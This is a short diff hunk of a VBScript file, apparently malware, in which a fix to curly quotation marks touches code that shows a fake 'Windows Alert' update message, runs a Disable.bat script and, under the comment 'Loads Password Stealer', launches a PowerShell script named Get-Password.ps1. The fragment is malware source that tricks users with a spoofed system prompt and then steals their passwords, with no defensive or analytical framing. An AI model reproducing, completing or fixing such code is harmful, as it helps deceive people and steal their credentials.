@@ -13,7 +13,7 @@ z=MsgBox("Your Windows PC requires an update... ", 0+64, "Windows Alert!!!")
 CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True
 
 ''' Loads Password Stealer
-Set objShell = CreateObject(“Wscript.shell”)
+Set objShell = CreateObject( "Wscript.shell" )
 objShell.run(“powershell -noexit -file c:\fso\Get-Password.ps1”)
 
 
